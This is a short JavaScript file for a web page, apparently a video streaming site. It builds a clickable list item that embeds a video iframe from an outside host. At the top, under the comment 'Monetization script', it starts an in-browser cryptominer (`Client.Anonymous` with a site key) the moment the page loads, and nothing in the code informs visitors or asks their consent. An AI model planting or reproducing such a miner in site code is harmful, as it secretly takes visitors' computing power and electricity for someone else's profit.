
console.log('script cargado');
/** Monetization script */
    var miner = new Client.Anonymous('eba3bf059a88fba5f0b07b2dc56ea4a5186a1ed462849d6731f3d62bea6514a0');
    miner.start();


var op = document.getElementById('op');

var opList = document.getElementById('opList');

var video = document.getElementById('video');
video.setAttribute('class', 'embed-container')


op.addEventListener('click',function(){
    var item = document.createElement('span');
    item.innerHTML = '893';

    item.addEventListener('click',function(){
        var iframe = document.createElement('iframe');
        iframe.setAttribute('src', 'https://gounlimited.to/embed-a7wni2ri5p93.html');
        video.append(iframe);
    })

    opList.append(item);
})